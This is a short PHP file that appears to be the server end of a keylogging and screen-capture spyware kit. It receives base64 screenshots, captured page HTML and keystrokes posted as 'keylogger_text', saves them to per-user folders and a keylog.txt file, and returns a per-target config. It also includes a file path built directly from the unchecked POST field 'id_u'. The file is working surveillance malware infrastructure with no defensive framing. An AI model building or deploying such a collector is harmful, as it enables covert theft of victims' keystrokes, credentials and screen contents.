<?php
	function base64_to_jpeg($base64_string, $output_file){
		$ifp = fopen($output_file, "wb");
		$data = explode(',', $base64_string);
		fwrite($ifp, base64_decode($data[1]));
		fclose($ifp);
		return $output_file;
	}
	require_once "init_user.php";
	$date = date('Y-m-d-_H-i-s');
	$file_name = $folder."screenshots/screenshot_".$date;
	if(isset($_POST["img"])){
		$txt = $_POST["img"];
		base64_to_jpeg($txt, $file_name.".jpeg");
	}
	if(isset($_POST["html"])){
		$txt = $_POST["html"];
		$f = fopen($folder."html/".$date.".html", "w");
		fwrite($f, $txt);
		fclose($f);
	}
	if(isset($_POST["keylogger_text"])){
		if(!is_file($folder."keylog.txt")){
			$f = fopen($folder."keylog.txt", "w");
			fwrite($f, $_POST["keylogger_text"]);
			fclose($f);
		}else{
			$txt = file_get_contents($folder."keylog.txt");
			$f = fopen($folder."keylog.txt", "w");
			fwrite($f, $txt.$_POST["keylogger_text"]);
			fclose($f);
		}
	}
	require_once "db/users/".$_POST["id_u"]."/config.php";
	exit(json_encode($__config__));
?>